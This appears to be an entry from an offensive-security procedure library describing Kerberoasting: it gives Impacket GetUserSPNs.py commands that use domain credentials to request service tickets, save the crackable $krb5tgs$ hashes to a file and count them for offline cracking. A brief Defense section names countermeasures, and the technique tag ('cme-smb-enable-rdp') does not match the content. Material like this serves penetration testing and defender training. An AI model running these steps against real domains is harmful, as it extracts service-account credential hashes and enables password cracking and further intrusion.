---
id: 588255c0-9513-4cee-bdad-6eb2ed7c5da2
name: kerberoast-spns-authenticated-domain-query
type: procedure
verified: true
submitted: true
created_at: '2019-12-04T19:39:54.389336+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[cme-smb-enable-rdp]]'
sub_techniques: []
tags:
  - known-vulnerability
  - network
  - service-attacks
  - kerberos
commands:
  - '[[commands/getuserspns-kerberoast-spns]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
validated: true
---

# Kerberoast SPNs Authenticated Domain Query

## Summary

This procedure uses domain credentials to query for service principal names (SPNs) and requests TGS tickets, exporting crackable RC4 hashes for offline Kerberoasting attacks on service accounts.

## Description

Kerberoasting exploits Kerberos by requesting TGS for SPN-linked accounts, enciphered with the account's NTLM hash (weak if password is guessable). Impacket automates SPN enumeration and ticket requests, yielding $krb5tgs$ hashes for Hashcat.

## Requirements

1. Valid domain creds
2. Impacket installed
3. DC IP
4. Service accounts with SPNs (common for MSSQL, HTTP)

## Defense

- Use long, complex passwords for service accounts (>25 chars)
- Enable AES encryption for Kerberos (disable RC4)
- Monitor AS/TS requests (Event ID 4769) for unusual SPN queries

## Objectives

1. Enumerate users with SPNs
2. Request and export TGS hashes
3. Prepare for offline cracking

## Instructions

### Step 1: Query SPNs

**Context**: List accounts with SPNs using LDAP.

**Command** ([[commands/getuserspns-kerberoast-spns]]):
```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DC_IP -request
```

> The -request flag triggers TGS; expected: SPN list and hashes.

### Step 2: Save Hashes

**Context**: Redirect output to file.

```bash
GetUserSPNs.py ... > kerb_hashes.txt
```

> Filters usable $krb5tgs$ lines.

### Step 3: Verify Hashes

**Context**: Count valid hashes.

```bash
grep '$krb5tgs' kerb_hashes.txt | wc -l
```

> Success if >0 hashes.
